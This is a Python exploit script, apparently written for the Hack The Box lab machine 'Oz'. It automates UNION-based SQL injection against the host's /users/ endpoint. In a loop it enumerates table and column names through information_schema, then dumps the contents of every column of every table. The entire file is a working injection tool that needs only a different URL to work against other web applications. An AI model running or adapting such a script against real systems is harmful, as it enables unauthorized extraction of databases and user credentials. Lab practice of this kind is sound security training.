#!/usr/bin/python3


import requests
import re
from pwn import *

print("USAGE:1..IF U WANNA DUMP TABLENAME--(-t)\n2...IF U WANNA DUMP COLUMNS THEN---(-c)\n3...IF U WANNA DUMP THE TABLE---(-all c)")

while True:
	user_input=input("what do u want to know bro? ")
	print()
	if("t" in user_input):
		g_query="table_name"
		m_query="information_schema.tables"
		e_query="where table_schema=database()-- -"
		log.success("TABLE_NAMES FOR U:")

	if("c" in user_input):
		g_query="column_name"
		m_query="information_schema.columns"
		e_query="where table_schema=database()-- -"
		log.success("COLUMN_NAMES FOR U:")
	if("all c" in user_input):
		# column_name=[]
		print("THESE ARE THE COLUMNS AND HERE IS THE DUMP OF THOSE COLUMNS")
		g_query="column_name"
		m_query="information_schema.columns"
		e_query="where table_schema=database()-- -"
		url="http://oz.htb/users/bhosa'union select group_concat({}) from {} {}".format(g_query,m_query,e_query)
		r=requests.get(url)
		response=r.text
		result=re.findall(r"username\":\"(.*[a-z])",response)[0]
		print(result)
		print(2 * "\n")
		log.success("DUMP:ENJOY")
		g_query="table_name"
		m_query="information_schema.tables"
		e_query="where table_schema=database()-- -"
		url="http://oz.htb/users/bhosa'union select group_concat({}) from {} {}".format(g_query,m_query,e_query)
		r=requests.get(url)
		response=r.text
		# print(response)
		result1=re.findall(r"username\":\"(.*[a-z])",response)[0]
		table_name=result1.split(",")
		column_name=result.split(",")
		for name1 in table_name:
			for name in column_name:
				# print(name)
				url1="http://oz.htb/users/bhosa'union select group_concat({}) from {}-- -".format(name,name1)   #tickets_gbw,users_gbw
				# print(url1)
				r=requests.get(url1)
				response=r.text
				if("Error" in response): #CHANGE THIS IN CASE U KNOW WHAT THE WEBISTE SAYS WHEN U GIVE BAD COMMANDS
					# print(response)
					continue
				# print(response)
				result=re.findall(r"username\":\"(.*[a-z0-9])",response)[0]
				print(name1 + "|" + name +":"+ result)
				print("-----------------------------------------")

		# print(column_name)
		continue
		





	url="http://oz.htb/users/bhosa'union select group_concat({}) from {} {}".format(g_query,m_query,e_query)

	r=requests.get(url)
	response=r.text
	# print(response)
	result=re.findall(r"username\":\"(.*[a-z])",response)[0]
	print(result)
	print()